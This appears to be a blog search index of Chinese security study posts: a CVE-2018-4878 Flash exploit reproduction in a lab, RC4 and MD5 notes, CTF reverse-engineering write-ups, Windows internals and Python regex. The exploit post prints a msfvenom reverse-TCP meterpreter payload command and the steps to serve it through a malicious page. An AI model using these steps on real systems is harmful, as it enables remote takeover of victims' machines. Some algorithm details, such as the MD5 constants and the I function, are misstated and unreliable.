<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CVE-2018-4878漏洞复现]]></title>
    <url>%2F2019%2F12%2F10%2FCVE-2018-4878%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[1、 引言2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2、影响版本Flash Player版本28.0.0.137以及之前的所有版本。3、漏洞复现4.1 漏洞复现环境Kali Linux + Windows 7 sp1 渗透机：Kali Linux 靶机：Windows 7 sp1 EXP：CVE-2018-4878.py Flash：flashplayer_activex_28.0.0.137.exe4.2 复现流程1、准备一台kali虚拟机与一台已关闭防火墙的win7虚拟机。 2、查看两台虚拟机的ip地址 Win7命令行：ipconfig： kali命令行：ifconfig： 3、在Kali Linux中使用msfvenom生成一个Python类型的Shell Code，代码如下： 1msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.36.249 lport=4444 -f python&gt;shellcode.txt lhost为Kali Linux的IP地址，lport为端口号，可以为其他。 4、生成shellcode.txt文件，打开cve-2018-4878.py文件和shellcode.txt文件，将cve-2018-4878.py中的shellcode替换为shellcode.txt中的shellcode。左图为cve-2018-4878.py中的代码，右图为shellcode.txt中的代码，将左图中的代码替换为右图中的代码，并保存更改。 5、修改cve-2018-4878.py中的文件信息，将其更改为自己存放的文件目录名，保存更改。（本人存放于文件CVE-2018-4878-master） 6、Kali Linux进入CVE-2018-4878-master路径，执行命令python cve-2018-4878.py生成exploit.swf和index2.html两个文件。 7、Kali Linux开启Apache2服务，将exploit.swf和index2.html文件复制到/var/www/html目录中。此时，Kali Linux上Web服务器启动，并且具备index2.html整个页面。只要靶机启用Flash插件并且访问该页面，则靶机可直接被控制。 8、Kali Linux在mfs5下使用handler模块开启会话监听。回弹一个tcp连接。设置kali渗透机的IP地址。设置监听端口，这个需跟上面msfvenom设置的端口一致。开启监听，等待目标上线。 9、在Windows7上 安装flash插件，使用Win7内置的IE 8浏览器访问页面：http://192.168.36.249/index2.html，页面显示如下。 10、切换到Kali Linux虚拟机，可以看到Kali Linux虚拟机上获取到了meterpreter shell，接下来可以用命令对靶机进行操作和管理。]]></content>
  </entry>
  <entry>
    <title><![CDATA[RC4算法学习]]></title>
    <url>%2F2019%2F09%2F15%2FRC4%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[算法原理RC4生成一种称为密钥流的伪随机流，它与明文通过异或操作混合，以达到加密的目的，解密时与密文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。 （1）KSA（the Key-Scheduling Algorithm）RC4首先使用密钥调度算法（KSA）完成对大小为256个字节的数组S的初始化及替换，在替换时使用密钥。其密钥长度一般取516字节，即40128位，通常不超过256位。先用0~255初始化数组S，然后使用密钥进行替换，C语言代码如下： 12345678910111213141516171819202122232425262728293031323334353637/*初始化S盒*/void InitSbox(unsigned char sbox[])&#123; for(int i = 0; i &lt; 256; i++) sbox[i] = i;&#125;/*密钥填充256数组*/void KeyExpansion(unsigned char key[], char *k, int len)&#123; if(len &lt;= 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i % len]; &#125; if(len &gt; 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i]; &#125;&#125;/*打乱S盒*/ void UpsetSbox(unsigned char sbox[], unsigned char key[])&#123; int j = 0; unsigned char temp; int n; for(int i = 0; i &lt; 256; i++) &#123; n = j + (int)sbox[i] + (int)key[i]; j = n % 256; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; &#125;&#125; （2）PRGA（the Pseudo-Random Generation Algorithm）数组S在完成初始化之后，便不再使用输入的密钥。密钥流的生成是从S[0]到S[255]的。对每个S[i]，根据当前的S的值，将S[i]与S中的另一字节置换。在S[255]完成转换后，操作仍重复执行。 12345678910111213141516171819202122/*加解密数据*/ void DataProcess(unsigned char sbox[], FILE *fp1, FILE *fp2)&#123; int i, j; i = 0; j = 0; char ch = fgetc(fp1); while(ch != EOF) &#123; i = (i + 1) % 256; int temp2 = j + (int)sbox[i]; j = temp2 % 256; unsigned char temp; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; int temp1 = (int)sbox[i] + (int)sbox[j]; int t = temp1 % 256; char k = sbox[t]; char cipherchar = ch ^ k; fputc(cipherchar, fp2); ch = fgetc(fp1); &#125;&#125;]]></content>
      <tags>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道base64算法CTF]]></title>
    <url>%2F2019%2F09%2F13%2F%E4%B8%80%E9%81%93BASE64%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95CTF%2F</url>
    <content type="text"><![CDATA[1、题目内容前两天做了道关于base64算法的题，flag为一段base64编码过后的密文，下面是这道题的链接：https://adworld.xctf.org.cn/media/task/attachments/a5c0e8322d9645468befabddfe0cb51d.exe 题目来源：XCTF社区2、解题过程这是一个exe文件，先用PEID进行查壳，没有壳，运行看看，要求你输入一个flah？拖入IDA，找到_main函数，按F5，代码如下我们可以看到一串关键字符串，逆推，字符串上方有一句for循环语句，经过异或得到下方的字符串，我用C语言写了段代码进行解密，代码如下： 12345678910#include &lt;stdio.h&gt;int main()&#123; int i; char str[50] = "you_know_how_to_remove_junk_code"; for(i = 0; str[i] != '\0'; i++) str[i] = str[i] ^ 0x25; printf("%s\n", str); return 0;&#125; 得到输出： 1\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@ 单击v13，再往前推可以发现还有两处di调用过v13，第二处的调用貌似没什么用，应该是垃圾代码，我们直接看第一次调用v13的函数，单击进入 这里是一段关键代码，再点击byte_414E40这个函数 现在可以判断使用了base64解码，所以将刚刚得到的字符串进行编码就可得到falg： 1XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=]]></content>
  </entry>
  <entry>
    <title><![CDATA[一些Windows基础知识]]></title>
    <url>%2F2019%2F09%2F13%2F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1、单位转换bit 位(指的是 0 or 1) byte 字节 1byte = 8 bit word 字 1 word = 2 byte dword (double word) 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB2、字节序大端序（Big endain） ：内存地址低位储存数据的高位， 小端序（Little endain）：内存地址高位储存数据的高位（x86是基于Intel8086处理器的小端体系结构） 3、ASCII码 4、Win APIAPI全名（Application Programming Interface 应用程序编程接口） 用于16位Windows的API（Windows1.0-Windows3.1）称作“Win16”，用于32位Windows的API（Windows 9x/NT/2000/XP/7/10）叫作“Win32”。64位WindowsAPI的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。API函数调用从Win16到Win32的转变中保持兼容，并且数量和功能上不断增强——Windows10 1.0只支持不到450个函数调用，现在已有几千个函数了。 Windows运转的核心是动态链接。Windows提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（DLL）实现。在Windows 9x 中，DLL通常位于\WINDOWS\SYSTEM子目录中。在Windows NT/2000/XP/7中，DLL通常位于系统安装目录的\SYSTEM和\SYSTEM32子目录中。 在早期，Windows的主要部分只需要在3个动态链接库中实现，它们分别代表Windows的三个主要子系统，叫做Kernel、User和GDI。 Kernel （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等； User （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等； GUI （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。 除了上述模块，Windows提供了其他DLL以支持更多功能，包括对象安全性、注册表操作（ADVAPI32.DLL）、通用控件（COMCTL32.DLL）、公共对话框（COMDLG32.DLL）、用户界面外壳（SHELL32.DLL）和网络（NETAPTI32.DLL）。5、WOW64WOW64（Windows-on-Windows64-bit）是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上。 64位的Windows，除了带有64位操作系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统文件都放在一个叫做“System32“的文件夹中，\Windows\System32文件夹中包含原生的64位映像文件。为了兼容32位操作系统，还增加了\Windows\SysWOW64文件夹，其中存储了32位的操作系统。 64位应用程序会加载System32目录下64位的kernel32.dll、user32.dll和ntdll.dll。当32位应用程序加载时，WOW64建立32位ntdll.dll所要求的启动环境，将CPU模式切换至32位，并开始执行32位加载器，就如同该进程在原生32位系统上一样。WOW64会对32位ntdll.dll的调用重定向ntdll.dll（64位），而不是发出原生的32位系统调用指令。WOW64转换到原生的64位模式，捕获于系统调用有关的参数，发出对应的原生64位系统调用。当原生的系统调用返回时，WOW64在返回32位模式之前将所有输出参数从64位转换成32位。 WOW64既不支持16位应用程序的执行（32位Windows支持16位应用程序的执行），也不支持加载32位内核模式的设备驱动。WOW64进程只能加载32位的DLL，不能加载原生的64位DLL。类似的，原生的64位进程不能加载32位的DLL。6、Windows消息机制Windows是一个消息（Message）驱动式系统。Windows消息提供在应用程序于应用程序之间、应用程序于Windows系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的相应和处理完成。 Windows系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由Windows监控。当一个事件发生时，WIindows先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的函数窗口。（1）SendMessage函数 （2）WM_COMMANFD消息 （3）WM_COMMAND消息 （4）WM_GETTEXT消息 （5）WM_QUIT消息 （6）WM_LBUTTONDOWN消息 7、虚拟内存在默认情况下，32位Windows操作系统的地址空间是在4GB以内。Win32的平坦内存模式使每个进程都拥有自己的虚拟空间。对32位进程来说，这个地址空间是4GB，因为32位指针拥有00000000h-FFFFFFFFh的任何值。此时，进程的代码和数据都放在同一地址空间中，不必区分代码段和数据段。 虚拟内存（Virtual Memory）不是真正的内存，它通过映射（Map）的方法使可用的虚拟地址（Virtual Address）达到4GB，每个应用程序可以获得2GB的虚拟地址，剩下的2GB留给操作系统自用。在Windows NT中，应用程序甚至可以获得3GB的虚拟地址。 Windows是一个分时的多任务操作系统，CPU时间在被分成一个个时间片后分配给不同的应用程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的4GB寻址空间，互不干扰。在物理内存中，操作系统和系统DLL代码需要供每个应用程序调用，所以他们在任意时刻必须被映射。用户的exe程序只在自己所属的时间片内被映射，用户dll则有选择地被映射。 实现方法和过程如下： 1、当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配2GB的虚拟地址（不是内存，只是地址）。 2、虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址（注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的）。 3、如果使用DLL，DLL也会被映射到进程的虚拟地址空间中。然后，虚拟内存管理器把每次内存访问映射到物理地址。]]></content>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows内核函数]]></title>
    <url>%2F2019%2F09%2F12%2FWindows%20%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Windows 内核函数Windows 内核部分会调用一些内核层的函数。这些函数都以固定的开始前缀，分别属于内核中不同的管理模块。通过函数名就可以大致知道这个函数所属的层次和模块。这些主要的前缀如下： * Ex：管理层。“Ex”是“Executive”的开头两个字母。 * Ke：核心层。“Ke”是“Kernel”的开头两个字母。 * HAL：硬件抽象层。“HAL”是“Hardware Abstraction Layer”的缩写。 * Ob：对象管理。“Ob”是“Object”的开头两个字母。 * MM：内存管理。“MM”是“Memory Manager”的缩写。 * Ps：进程（线程）管理。“Ps”表示“Process”。 * Se：安全管理。“Se”是“Security”的开头两个字母。 * Io：I/O管理。 * Fs：文件系统。“Fs”是“File System”的缩写。 * Cc：文件缓存管理。“Cc”表示“Cache”。 * Cm：系统配置管理。“Cm”是“Configuration Manager”的缩写。 * Pp：即插即用管理。“Pp”表示“Pnp”。 * Rtl：运行时程序库。“Rtl”是“Runtime Library”的缩写。 * Zw/Nt：对应于SSDT中的服务函数，例如与文件或者注册表相关的操作函数。 * Flt：Minifilter文件过滤驱动中调用的函数。 * Ndis：Ndis网络框架中调用的函数。]]></content>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5算法学习]]></title>
    <url>%2F2019%2F09%2F10%2FMD5%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、题目内容 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为：TASC?O3RJMV?WDJKX?ZM 。 题目来源：安恒杯 简单的MD5密码碰撞，通过对比密文e9032与加密后的数据，定位相关信息。我用Python写了一个简单的解题代码，运行后得出密文。3. 解题代码如下1234567891011121314151617181920import md5Enable = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q', 'R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8', '9',' ', '!', '"', '#', '$', '%', '&amp;', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '&gt;', '?', '@','[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k','l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '&#123;', '|', '&#125;', '~'&#125;fiveCode = ""for i in Enable: for j in Enable: for k in Enable: strToDecode = "TASC" + i + "O3RJMV" + j + "WDJKX" + k + "ZM" m1 = md5.new() m1.update(strToDecode) cipher = m1.hexdigest() fiveCode = cipher[0:5] if fiveCode == "e9032": print "密文：" + cipher 结果如下： 1密文：e9032994dabac08080091151380478a2 4、MD5算法1、算法原理 （1）数据填充 填充消息使其长度与448模512同余（即长度=448 mod 512）.也就是说，填充后的消息长度比512的倍数小64位。填充方法：附一个1在消息后面，然后用0来填充，直到消息的长度与448模512同余。至少填充1位，至多填充512位。 （2）添加长度 在上一步的结果之后附上64位的消息长度。如果填充前消息长度大于2^64，则只使用其低64位。添加填充位和消息长度之后，最终消息的长度正好是512的整数倍。 （3）初始化变量 用四个变量（A、B、C、D）来计算消息摘要。这里的A、B、C、D都是32位的寄存器。这些寄存器以下面的十六进制来初始化： A=01234567h，B=89abcdefh，C=fedcbah，D=76543210h 而且，在内存中是以低字节在前的形式储存的，格式如下： 01 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10 （4）数据处理 以512位分组为单位处理消息。首先定义4个辅助函数，每个都是以3个32为双字作为输入，输出1个32位双字。 F(X，Y，Z) = (X&amp;Y)|((~X)&amp;Z) G(X，Y，Z) = (X&amp;Z)|(Y&amp;(~Z)) H(X，Y，Z) = X^Y^Z I(X，Y，Z) = Y^X|(~Z) 注：&quot;&amp;&quot;是与操作，&quot;|&quot;是或操作，&quot;~&quot;是非操作，&quot;^&quot;是异或操作。 这四轮变换是对进入主循环的521位消息分组的16个32位字分别进行如下操作：将A、B、C、D的副本a、b、c、d中的3个经F、G、H、I运算后的结果与第4个相加，再加上32位字和一个32位字的加法常数，并将所得的值循环左移若干位，最后结果加上啊a、b、c、d其中一个，并回送至A、B、C、D，由此完成一次循环。 所用的加法常数由表T[i]来定义，其中i为1至64之中的值。T[i]等于4294967296乘以abs(sin(i))所得结果的整数部分，其中i用弧度来表示。 FF(a, b, c, d, M[j], s, ti)表示 a = b + ((a + F(b, c, d) + Mj + ti) &lt;&lt;&lt; s) GG(a, b, c, d, M[j], s, ti)表示 a = b + ((a + G(b, c, d) + Mj + ti) &lt;&lt;&lt; s) HH(a, b, c, d, M[j], s, ti)表示 a = b + ((a + H(b, c, d) + Mj + ti) &lt;&lt;&lt; s) II(a, b, c, d, M[j], s, ti)表示 a = b + ((a + I(b, c, d) + Mj + ti) &lt;&lt;&lt; s) For i = 0 to N/16-1 do For j = 0 to 15 do Set X[j] to M[i*16+j] AA=A; BB=B; CC=C; DD=D FF(a,b,c,d,M[0],7,0xd76aa478) ; FF(d,a,b,c,M[1],12,0xe8c7b756) ; FF(c,d,a,b,M[2],17,0x242070db) ; FF(b,c,d,a,M[3],22,0xc1bdceee) ; FF(a,b,c,d,M[4],7,0xf57c0faf) ; FF(d,a,b,c,M[5],12,0x4787c62a) ; FF(c,d,a,b,M[6],17,0xa8304613) ; FF(b,c,d,a,M[7],22,0xfd469501) ; FF(a,b,c,d,M[8],7,0x698098d8) ; FF(d,a,b,c,M[9],12,0x8b44f7af) ; FF(c,d,a,b,M[10],17,0xffff5bb1); FF(b,c,d,a,M[11],22,0x895cd7be); FF(a,b,c,d,M[12],7,0x6b901122) ; FF(d,a,b,c,M[13],12,0xfd987193); FF(c,d,a,b,M[14],17,0xa679438e); FF(b,c,d,a,M[15],22,0x49b40821); GG(a,b,c,d,M[1],5,0xf61e2562) ; GG(d,a,b,c,M[6],9,0xc040b340) ; GG(c,d,a,b,M[11],14,0x265e5a51); GG(b,c,d,a,M[0],20,0xe9b6c7aa) ; GG(a,b,c,d,M[5],5,0xd62f105d) ; GG(d,a,b,c,M[10],9,0x02441453) ; GG(c,d,a,b,M[15],14,0xd8a1e681); GG(b,c,d,a,M[4],20,0xe7d3fbc8) ; GG(a,b,c,d,M[9],5,0x21e1cde6) ; GG(d,a,b,c,M[14],9,0xc33707d6) ; GG(c,d,a,b,M[3],14,0xf4d50d87) ; GG(b,c,d,a,M[8],20,0x455a14ed) ; GG(a,b,c,d,M[13],5,0xa9e3e905) ; GG(d,a,b,c,M[2],9,0xfcefa3f8) ; GG(c,d,a,b,M[7],14,0x676f02d9) ; GG(b,c,d,a,M[12],20,0x8d2a4c8a); HH(a,b,c,d,M[5],4,0xfffa3942) ; HH(d,a,b,c,M[8],11,0x8771f681) ; HH(c,d,a,b,M[11],16,0x6d9d6122); HH(b,c,d,a,M[14],23,0xfde5380c); HH(a,b,c,d,M[1],4,0xa4beea44) ; HH(d,a,b,c,M[4],11,0x4bdecfa9) ; HH(c,d,a,b,M[7],16,0xf6bb4b60) ; HH(b,c,d,a,M[10],23,0xbebfbc70); HH(a,b,c,d,M[13],4,0x289b7ec6) ; HH(d,a,b,c,M[0],11,0xeaa127fa) ; HH(c,d,a,b,M[3],16,0xd4ef3085) ; HH(b,c,d,a,M[6],23,0x04881d05) ; HH(a,b,c,d,M[9],4,0xd9d4d039) ; HH(d,a,b,c,M[12],11,0xe6db99e5); HH(c,d,a,b,M[15],16,0x1fa27cf8); HH(b,c,d,a,M[2],23,0xc4ac5665) ; II(a,b,c,d,M[0],6,0xf4292244) ; II(d,a,b,c,M[7],10,0x432aff97) ; II(c,d,a,b,M[14],15,0xab9423a7); II(b,c,d,a,M[5],21,0xfc93a039) ; II(a,b,c,d,M[12],6,0x655b59c3) ; II(d,a,b,c,M[3],10,0x8f0ccc92) ; II(c,d,a,b,M[10],15,0xffeff47d); II(b,c,d,a,M[1],21,0x85845dd1) ; II(a,b,c,d,M[8],6,0x6fa87e4f) ; II(d,a,b,c,M[15],10,0xfe2ce6e0); II(c,d,a,b,M[6],15,0xa3014314) ; II(b,c,d,a,M[13],21,0x4e0811a1); II(a,b,c,d,M[4],6,0xf7537e82) ; II(d,a,b,c,M[11],10,0xbd3af235); II(c,d,a,b,M[2],15,0x2ad7d2bb) ; II(b,c,d,a,M[9],21,0xeb86d391) ; A = A+AA; B = B+BB; C = C+CC; D = D+DD （5）输出 当512位分组都运算完毕，A、B、C、D的连级将被输出为MD5散列的结果。]]></content>
  </entry>
  <entry>
    <title><![CDATA[一道RE学习：IngiteMe]]></title>
    <url>%2F2019%2F09%2F10%2FIgniteMe%E9%80%86%E5%90%91%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、RE-IgniteMe这道题来自XCTF社区，比较简单。 题目链接：https://adworld.xctf.org.cn/media/task/attachments/fac4d1290e604fdfacbbe06fd1a5ca39.exe2、解题思路下载好后我们发现这是一个EXE文件，先拖入PEID查壳看看，发现没有壳。直接运行，题目要求你输入flag，我们用IDA打开，进入_main函数，按F5 我们可以发现一串“Congratulations！”字符，这里应该就是关键判断，双击它sub_4011C0函数，进入查看 可以看到末尾的关键字符串，从后往前推，它的主要算法是异或和加减以及大小写字母之间的转换，我用C语言写了段代码进行解码，代码如下： 12345678910111213141516171819202122int main()&#123; int i; char str[32] = "GONDPHyGjPEKruv&#123;&#123;pj]X@rF"; int num[32] = &#123;0x0D, 0x13,0x17,0x11,2,1, 0x20,0x1D,0x0C,2,0x19,0x2F,0x17,0x2B,0x24, 0x1F,0x1E,0x16,9,0x0F,0x15,0x27,0x13,0x26, 0x0A,0x2F,0x1E,0x1A,0x2D,0x0C,0x22,4&#125;; for(i = 0; str[i] !='\0'; i++) &#123; str[i] = ((str[i]^num[i])-72)^0x55; if(str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') str[i] -= 32; if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') str[i] += 32; &#125; printf("EIS&#123;%s&#125;\n",str); return 0;&#125; 运行后得出flag： 1EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125; 3、总结逆向过程需要耐心和不断地尝试。]]></content>
      <tags>
        <tag>XCTF-RE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式的学习]]></title>
    <url>%2F2019%2F09%2F10%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、re.match函数re.match尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法：1、re.match(pattren, string, flags=0) 说明：pattern:匹配的正则表达式。 string:要匹配的字符串。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。匹配成功re.match方法返回一个匹配的对象，否则返回none。可以使用group(num)或group()匹配对象函数来获取匹配表达式。 group(num=0):匹配的整个表达式的字符串，group()可以一次输入多个组号，在这种情况下它将返回一个包含那些所对应值的元组。 groups():返回一个包含所有小组字符串的元组，从1到所含的小组号。实例： 123import reprint(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配 运行结果： 12(0, 3)None 实例： 12345678910111213#!/usr/bin/pythonimport re line = "Cats are smarter than dogs" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print "matchObj.group() : ", matchObj.group() print "matchObj.group(1) : ", matchObj.group(1) print "matchObj.group(2) : ", matchObj.group(2)else: print "No match!!" 运行结果: 123matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter 2、re.search方法re.search扫描整个字符串并返回第一个成功的匹配。 函数语法： re.search(p,attern, string, flags=0)实例： 123456#!/usr/bin/python# -*- coding: UTF-8 -*- import reprint(re.search('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.search('com', 'www.runoob.com').span()) # 不在起始位置匹配 结果： 12(0, 3)(11, 14) re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 3、检索和替换re.sub(pattren, repl, string, count=0, flags=0) 说明：repl：替换的字符串，也可以为一个函数。 count：模式匹配后替换的最大次数，默认0表示替换所有的匹配。1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*- import re phone = "2004-959-559 # 这是一个国外电话号码" # 删除字符串中的 Python注释 num = re.sub(r'#.*$', "", phone)print "电话号码是: ", num # 删除非数字(-)的字符串 num = re.sub(r'\D', "", phone)print "电话号码是 : ", num 结果： 12电话号码是: 2004-959-559 电话号码是 : 2004959559 findall 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。语法格式为： findall(string[, pos[, endpos]]) 参数： string : 待匹配的字符串。 pos : 可选参数，指定字符串的起始位置，默认为 0。 endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。实例： 12345678910# -*- coding:UTF8 -*- import re pattern = re.compile(r'\d+') # 查找数字result1 = pattern.findall('runoob 123 google 456')result2 = pattern.findall('run88oob123google456', 0, 10) print(result1)print(result2) 结果： 12['123', '456']['88', '12'] re.finditer 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0)实例： 1234import reit = re.finditer(r"\d+","12a32bc43jf3") for match in it: print (match.group() ) 结果： 123412 32 43 3 4、正则表达式修饰符 - 可选标志re.I：使匹配对大小写不敏感 re.L：做本地化识别（locale-aware）匹配 re.M：多行匹配，影响 ^ 和 $ re.S：使 . 匹配包括换行在内的所有字符 re.U：根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B. re.X：该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。6、正则表达式模式^：匹配字符串的开头$：匹配字符串的末尾。.：匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。[…]：用来表示一组字符,单独列出：[amk] 匹配’a’，’m’或’k’[^…]：不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。re：匹配0个或多个的表达式。re+：匹配1个或多个的表达式。re?：匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式re{ n}：精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。re{ n,}：匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于”o“。re{ n, m}：匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式a| b：匹配a或b(re)：对正则表达式分组并记住匹配的文本(?imx)：正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。(?-imx)：正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。(?: re)：类似 (…), 但是不表示一个组(?imx: re)：在括号中使用i, m, 或 x 可选标志(?-imx: re)：在括号中不使用i, m, 或 x 可选标志(?#…)：注释.(?= re)：前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。(?! re)：前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功(?&gt; re)：匹配的独立模式，省去回溯。\w：匹配字母数字及下划线\W：匹配非字母数字及下划线\s：匹配任意空白字符，等价于 [\t\n\r\f].\S：匹配任意非空字符\d：匹配任意数字，等价于 [0-9].\D：匹配任意非数字\A：匹配字符串开始\Z：匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。\z：匹配字符串结束\G：匹配最后匹配完成的位置。\b：匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’：可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B：匹配非单词边界。’er\B’ 能匹配 “verb”中的’er’，但不能匹配 “never” 中的 ‘er’。\n, \t, 等. ：匹配一个换行符。匹配一个制表符。等\1…\9：匹配第n个分组的内容。\10：匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。]]></content>
  </entry>
</search>
